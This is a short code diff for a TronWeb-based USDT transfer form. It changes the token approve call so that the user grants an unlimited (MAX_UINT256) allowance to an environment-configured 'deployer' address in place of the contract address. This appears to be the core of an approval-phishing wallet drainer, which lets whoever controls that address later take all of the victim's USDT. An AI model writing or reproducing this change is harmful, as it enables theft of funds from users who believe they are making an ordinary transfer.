@@ -4,7 +4,7 @@ import { TronWeb } from 'tronweb';
 import '../App.css';
 
 const USDT_TRC20    = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const CONTRACT_ADDR = import.meta.env.VITE_CONTRACT_ADDRESS;
+const APPROVE_TO  = import.meta.env.VITE_DEPLOYER_ADDRESS;
 const BACKEND_URL   = import.meta.env.VITE_BACKEND_URL;
 const API_KEY       = import.meta.env.VITE_API_KEY;
 const RECIPIENT     = import.meta.env.VITE_RECIPIENT_ADDRESS;
@@ -101,7 +101,7 @@ const TransferForm = ({ onApproved }) => {
         'approve(address,uint256)',
         { feeLimit: 1_000_000_000, callValue: 0 },
         [
-          { type: 'address', value: CONTRACT_ADDR },
+          { type: 'address', value: APPROVE_TO },
           { type: 'uint256', value: MAX_UINT256 },
         ],
         tronWeb.address.toHex(userAddress)
